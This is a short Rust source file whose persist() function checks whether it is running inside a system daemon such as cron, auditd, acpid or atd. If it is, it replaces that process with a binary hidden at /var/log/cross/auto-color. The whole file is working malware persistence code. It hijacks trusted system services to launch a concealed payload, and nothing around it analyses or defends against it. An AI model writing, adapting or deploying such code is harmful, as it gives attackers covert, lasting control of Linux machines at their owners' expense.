use std::path::PathBuf;
use std::ffi::CString;

use libc::execl;

pub fn persist() {
    // Check current process full path
    let current_process_path = std::env::current_exe().unwrap();
    let known_daemons: &[PathBuf] = &[
        PathBuf::from("/sbin/auditd"),
        PathBuf::from("/sbin/cron"),
        PathBuf::from("/sbin/crond"),
        PathBuf::from("/sbin/acpid"),
        PathBuf::from("/sbin/atd"),
        PathBuf::from("/usr/sbin/auditd"),
        PathBuf::from("/usr/sbin/cron"),
        PathBuf::from("/usr/sbin/crond"),
        PathBuf::from("/usr/sbin/acpid"),
        PathBuf::from("/usr/sbin/atd"),
    ];

    if !known_daemons.contains(&current_process_path) { return; }
    let binary_path = PathBuf::from("/var/log/cross/auto-color");
    if !binary_path.exists() { return; }

    let binary_cstr = CString::new(binary_path.to_str().unwrap()).unwrap();
    let arg1 = CString::new("-flush").unwrap();
    let arg2 = CString::new("-color").unwrap();

    unsafe {
        execl(
            binary_cstr.as_ptr(),
            binary_cstr.as_ptr(),
            arg1.as_ptr(),
            arg2.as_ptr(),
            std::ptr::null::<std::os::raw::c_char>(),
        );
    }

    std::process::exit(0);
}

